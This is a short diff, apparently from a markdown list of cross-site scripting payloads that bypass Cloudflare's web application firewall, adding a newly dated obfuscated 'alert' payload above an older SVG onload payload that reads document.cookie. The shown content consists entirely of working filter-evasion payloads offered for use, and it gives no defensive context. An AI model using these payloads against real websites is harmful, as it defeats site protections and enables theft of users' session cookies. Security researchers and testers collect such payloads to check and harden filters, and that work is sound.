@@ -5,6 +5,9 @@ The payloads are headed by the date of discovery of the bypass.
 ### Cloudflare
 
 ```csharp
+//26-11-2021:
+-top['al\x65rt']('xss')-
+
 //24-10-2021:
 <svg onload=alert&#0000000040document.cookie)>
 
